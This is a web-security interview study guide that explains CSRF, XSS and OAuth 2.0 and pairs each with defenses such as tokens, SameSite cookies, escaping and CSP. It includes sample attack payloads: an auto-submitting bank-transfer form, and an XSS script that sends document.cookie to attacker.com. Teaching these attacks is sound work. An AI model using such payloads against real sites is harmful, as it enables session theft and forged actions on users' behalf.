# Security

## CSRF (Cross-Site Request Forgery)

### 1. Short explanation (What + Why)

**What:**
CSRF is a security attack where an attacker tricks an authenticated user’s browser into sending an unwanted request to a trusted website.

**Why:**
Browsers automatically attach cookies (including session cookies) to requests, so an attacker can perform actions on behalf of the user without knowing their credentials.

Example:

* User is logged into `bank.com`
* Attacker creates a malicious page
* User opens it
* Browser sends a money transfer request to `bank.com` with the user's cookie

---

### 2. Simple internal working (Senior interview level)

1. User logs into an application:

```
bank.com → Browser stores session cookie
```

2. Attacker creates a malicious request:

```html
<form action="https://bank.com/transfer" method="POST">
  <input name="amount" value="10000">
  <input name="to" value="attacker">
</form>

<script>
  document.forms[0].submit();
</script>
```

3. User visits attacker website.

4. Browser automatically sends:

```
POST /transfer
Cookie: sessionId=abc123
```

5. Server thinks:

```
"This request has a valid session cookie, so it must be from the user."
```

6. Action is executed.

---

### 3. Practical prevention examples

#### 1. CSRF Token (Most common)

Server generates a random token:

```
csrfToken = "a8x92ks..."
```

Frontend sends:

```html
<input type="hidden" name="csrfToken" value="a8x92ks">
```

Request:

```
POST /transfer

Cookie: sessionId=abc123
Body:
csrfToken=a8x92ks
amount=10000
```

Server verifies:

```javascript
if (csrfToken !== storedToken) {
   return 403;
}
```

---

#### 2. SameSite Cookie

Configure cookies:

```http
Set-Cookie:
sessionId=abc123;
SameSite=Strict;
Secure;
HttpOnly
```

Options:

* `Strict` → Cookie never sent cross-site
* `Lax` → Cookie sent only in safer navigation cases
* `None` → Allows cross-site (requires Secure)

---

#### 3. Verify Origin/Referer Header

Server checks:

```
Origin: https://myapp.com
```

Reject:

```
Origin: https://attacker.com
```

---

### 4. One-line memory trick

**"CSRF abuses your browser's trust (cookies); prevent it by adding something the attacker cannot know (token)."**

---

### 5. Senior Interview Questions

#### Q1. CSRF vs XSS difference?

**Answer:**

| CSRF                                          | XSS                                     |
| --------------------------------------------- | --------------------------------------- |
| Tricks user browser to send requests          | Injects malicious JavaScript            |
| Uses existing authentication                  | Steals data/session or performs actions |
| Server-side request forgery from user browser | Client-side code execution              |

---

#### Q2. If we use JWT instead of cookies, do we need CSRF protection?

**Answer:**

Usually no, if JWT is stored in memory or Authorization header:

```
Authorization: Bearer token
```

because browsers don't automatically attach it.

But JWT stored in cookies still requires CSRF protection.

---

#### Q3. Why is SameSite cookie not always enough?

**Answer:**

Because:

* Older browsers may not support it fully
* Some applications require cross-site requests
* Complex authentication flows may need CSRF tokens

Best practice is usually:

```
SameSite + CSRF Token + Origin validation
```

---

### 6. Common Mistakes

❌ Thinking CSRF steals user credentials
→ It performs actions using existing authentication.

❌ Using only CORS as CSRF protection
→ CORS controls reading responses, not sending requests.

❌ Storing JWT in cookies without CSRF protection

❌ Disabling CSRF protection because "we use HTTPS"

---

### 7. 30-second Interview Response

"CSRF is an attack where an attacker tricks an authenticated user's browser into making unwanted requests to a trusted application. It happens because browsers automatically attach cookies with requests. We prevent it using CSRF tokens, SameSite cookies, and validating request origin. In modern applications, if authentication tokens are stored in Authorization headers instead of cookies, CSRF risk is significantly reduced."


## XSS (Cross-Site Scripting)

### 1. Short explanation (What + Why)

**What:**
XSS is a security vulnerability where an attacker injects malicious JavaScript into a web page that executes in another user's browser.

**Why:**
The injected script runs with the same permissions as the website, allowing it to steal cookies, tokens, user data, or perform actions on behalf of the user.

Example:

* User submits a malicious comment:

```html
<script>alert("Hacked!")</script>
```

* Other users open the page.
* The script executes in their browser.

---

### 2. Simple internal working (Senior interview level)

1. Application accepts user input.

```
Comment:
<script>fetch('https://attacker.com?cookie='+document.cookie)</script>
```

2. Application stores/displays it **without sanitizing or escaping**.

3. Another user visits the page.

4. Browser treats it as JavaScript instead of plain text.

5. Script executes with the website's privileges.

Result:

* Steal cookies (if not HttpOnly)
* Read page content
* Send authenticated requests
* Redirect users
* Capture keystrokes

---

### 3. Types of XSS

#### 1. Stored XSS (Most Dangerous)

Malicious script is stored in the database.

Flow:

```
Attacker → Database → Every visitor executes it
```

Example:

```
Comment:
<script>alert("XSS")</script>
```

---

#### 2. Reflected XSS

Script comes from the request and is immediately reflected.

Example:

```
https://site.com/search?q=<script>alert(1)</script>
```

Server returns:

```html
Results for:
<script>alert(1)</script>
```

The browser executes it.

---

#### 3. DOM-based XSS

The vulnerability exists entirely in client-side JavaScript.

Bad example:

```javascript
const name = location.hash;
document.getElementById("user").innerHTML = name;
```

If URL is:

```
site.com/#<img src=x onerror=alert(1)>
```

The script executes.

---

### 4. Prevention

#### Escape Output

Instead of rendering HTML:

```html
<script>alert(1)</script>
```

Render:

```text
&lt;script&gt;alert(1)&lt;/script&gt;
```

---

#### Sanitize HTML

If HTML is allowed (rich text):

```javascript
DOMPurify.sanitize(userInput);
```

---

#### Avoid `innerHTML`

Bad:

```javascript
div.innerHTML = userInput;
```

Good:

```javascript
div.textContent = userInput;
```

---

#### Content Security Policy (CSP)

Example:

```http
Content-Security-Policy:
default-src 'self';
script-src 'self';
```

This blocks unauthorized scripts from executing.

---

#### HttpOnly Cookies

```
Set-Cookie:
HttpOnly
```

Even if XSS occurs:

```javascript
document.cookie
```

cannot read the cookie.

---

### 5. One-line memory trick

**"XSS injects JavaScript into your page; prevent it by escaping, sanitizing, and never trusting user input."**

---

### 6. Senior Interview Questions

#### Q1. Stored vs Reflected vs DOM XSS?

**Answer:**

| Type      | Where payload exists  |
| --------- | --------------------- |
| Stored    | Database              |
| Reflected | HTTP Request/Response |
| DOM       | Browser JavaScript    |

---

#### Q2. Why is `innerHTML` dangerous?

**Answer:**

Because the browser parses the string as HTML.

```javascript
div.innerHTML = "<script>alert(1)</script>";
```

The script or event handlers can execute.

Prefer:

```javascript
textContent
```

---

#### Q3. Does React automatically protect against XSS?

**Answer:**

Mostly yes.

React escapes values by default:

```jsx
<div>{userInput}</div>
```

Safe.

But this is dangerous:

```jsx
<div dangerouslySetInnerHTML={{ __html: html }} />
```

Always sanitize HTML (e.g., with DOMPurify) before using `dangerouslySetInnerHTML`.

---

### 7. Common Mistakes

❌ Trusting user input

❌ Using `innerHTML` with untrusted data

❌ Thinking HTTPS prevents XSS

❌ Forgetting to sanitize rich-text editors

❌ Using `dangerouslySetInnerHTML` without sanitization

❌ Assuming HttpOnly completely prevents XSS (it protects cookies, not the page itself)

---

### 8. 30-second Interview Response

"XSS is a vulnerability where an attacker injects malicious JavaScript that executes in another user's browser. The main types are Stored, Reflected, and DOM-based XSS. It can steal sensitive data, hijack sessions, or manipulate the page. We prevent it by escaping output, sanitizing HTML, avoiding `innerHTML`, using Content Security Policy, and protecting cookies with the HttpOnly flag. Frameworks like React escape content by default, but features like `dangerouslySetInnerHTML` must be used carefully."



| **CSRF**                                              | **XSS**                                                   |
| ----------------------------------------------------- | --------------------------------------------------------- |
| Tricks the **browser** into sending unwanted requests | Injects **malicious JavaScript** into the page            |
| Exploits **user's authentication (cookies)**          | Exploits **website's trust in user input**                |
| No JavaScript injection required                      | Requires JavaScript execution                             |
| Goal: Perform actions as the user                     | Goal: Steal data, cookies, tokens, or manipulate the page |
| Prevent with **CSRF Token, SameSite, Origin check**   | Prevent with **escaping, sanitization, CSP**              |

## OAuth 2.0 (End-to-End)

### 1. Short explanation (What + Why)

**What:**
OAuth 2.0 is an **authorization framework** that allows users to give an application limited access to their resources **without sharing their password**.

Example:

* "Login with Google"
* "Allow this app to access my Google profile"

**Why:**

* Secure third-party access
* No password sharing
* Fine-grained permissions using scopes
* Standard approach for modern authentication systems

> Note: OAuth 2.0 is primarily for **authorization**. For user identity/login, **OpenID Connect (OIDC)** is commonly used on top of OAuth 2.0.

---

### 2. Simple internal working (Senior Interview Level)

#### OAuth 2.0 Authorization Code Flow (Most commonly used)

##### Components:

```
User
 |
Client Application (Frontend)
 |
Authorization Server (Google/Auth0/Keycloak)
 |
Resource Server (Your Backend API)
```

---

#### End-to-End Flow

##### Step 1: User clicks Login

Frontend redirects user:

```
Frontend
   |
   | redirect
   ↓
Authorization Server
```

Example:

```
https://auth.com/authorize?
client_id=my-app
&redirect_uri=myapp.com/callback
&response_type=code
&scope=profile
```

---

##### Step 2: User authenticates

Authorization server:

* Validates username/password
* Performs MFA if required
* Shows consent screen

Example:

```
"Allow MyApp to access your profile?"
```

---

##### Step 3: Authorization Code returned

After approval:

```
Authorization Server
        |
        ↓
Frontend Callback

/callback?code=abc123
```

The code is short-lived.

---

##### Step 4: Exchange code for tokens

Frontend/backend sends:

```
POST /token

{
 code: abc123,
 client_id,
 client_secret
}
```

Authorization server returns:

```json
{
 "access_token": "eyxxxx",
 "refresh_token": "rtyyyy",
 "expires_in": 3600
}
```

---

##### Step 5: Call protected APIs

Frontend sends:

```
GET /profile

Authorization: Bearer eyxxxx
```

---

##### Step 6: Backend validates token

Backend checks:

* Signature
* Expiration
* Issuer
* Audience
* Scopes

If valid:

```
Access granted
```

---

#### OAuth Flow Diagram

```
User
 |
 | Login
 ↓
Frontend
 |
 | Authorization Request
 ↓
OAuth Provider
 |
 | Authorization Code
 ↓
Frontend/Backend
 |
 | Exchange Code
 ↓
Token Endpoint
 |
 | Access Token
 ↓
API Server
 |
 | Validate Token
 ↓
Resource Access
```

---

### 3. Small practical example/code

#### Frontend redirect

```javascript
window.location.href =
"https://auth.company.com/authorize?" +
"client_id=my-app&" +
"response_type=code&" +
"scope=profile";
```

---

#### API Request with token

```javascript
fetch("/api/orders", {
  headers: {
    Authorization: `Bearer ${accessToken}`
  }
});
```

---

#### Backend token validation

```javascript
jwt.verify(
  token,
  publicKey
);
```

---

### 4. Important OAuth Concepts

#### Access Token

Used to access APIs.

Example:

```
GET /users

Authorization: Bearer token
```

Usually short-lived.

---

#### Refresh Token

Used to get a new access token.

Flow:

```
Access Token Expired
        |
        ↓
Refresh Token
        |
        ↓
New Access Token
```

---

#### Scope

Defines permissions.

Example:

```
scope:
read:user
write:orders
delete:account
```

---

#### Client ID

Public identifier of your application.

---

#### Client Secret

Private credential used by backend applications.

---

### 5. One-line Memory Trick

**"OAuth = Give limited access using tokens, without sharing passwords."**

---

### 6. 3 Important Senior Interview Questions

#### Q1. OAuth 2.0 vs JWT?

**Answer:**

They solve different problems:

* OAuth 2.0 → Authorization framework (how tokens are issued)
* JWT → Token format (how information is represented)

OAuth can use JWT access tokens, but they are not the same.

---

#### Q2. Why use Authorization Code Flow instead of Implicit Flow?

**Answer:**

Authorization Code Flow is safer because:

* Tokens are not exposed in browser URLs
* Supports refresh tokens
* Client authentication is possible

Implicit Flow is deprecated for most modern applications.

---

#### Q3. Where should access and refresh tokens be stored?

**Answer:**

Recommended:

* Access token → memory (short-lived)
* Refresh token → HttpOnly Secure Cookie

Avoid storing sensitive tokens in localStorage because XSS can steal them.

---

### 7. Common Mistakes

❌ Thinking OAuth is authentication only
→ OAuth provides authorization; OIDC handles authentication.

❌ Storing tokens insecurely.

❌ Sending client secret from frontend.

❌ Using long-lived access tokens.

❌ Not validating token claims on backend.

❌ Confusing OAuth with JWT.

---

### 8. 30-Second Interview Response

> "OAuth 2.0 is an authorization framework that allows applications to access user resources without sharing passwords. The most common flow is Authorization Code Flow, where the user authenticates with the authorization server, receives a temporary code, and exchanges it for access and refresh tokens. The frontend uses the access token to call protected APIs, and the backend validates the token before granting access. In production systems, I prefer short-lived access tokens, secure refresh tokens, proper scopes, and token validation."

---

## Security Quick Reference

*(Condensed overview — see the detailed topics above for full explanations.)*

### XSS (Cross-Site Scripting)
Attacker sneaks JS into your page, usually through unescaped user input, and it runs in *other* users' browsers.
```jsx
<div dangerouslySetInnerHTML={{ __html: userComment }} /> // ❌ if userComment = "<img src=x onerror=alert('hacked')>"
<div>{userComment}</div> // ✅ React escapes this automatically
```

### CSRF (Cross-Site Request Forgery)
Tricks a *logged-in* user's browser into firing a request they didn't intend (e.g., a hidden auto-submitting form on a malicious site that hits your bank's transfer endpoint, using the victim's existing cookies).
**Defense:** CSRF tokens + `SameSite` cookies.

### CSP (Content Security Policy)
A response header that whitelists where scripts/styles/images are allowed to load from, so even if an attacker injects a `<script src="evil.com">`, the browser refuses to run it.
```
Content-Security-Policy: script-src 'self' https://trusted-cdn.com;
```

### OAuth
Lets a user grant App A access to their data on App B ("Sign in with Google") without ever handing App A their Google password.

### JWT (JSON Web Token)
A signed token (`header.payload.signature`) carrying user identity — the server can verify it wasn't tampered with, without a database lookup, enabling stateless auth.

### SameSite cookies
```
Set-Cookie: session=abc123; SameSite=Strict
```
`Strict`/`Lax` stop the cookie from being sent on cross-site requests — a direct defense against CSRF.
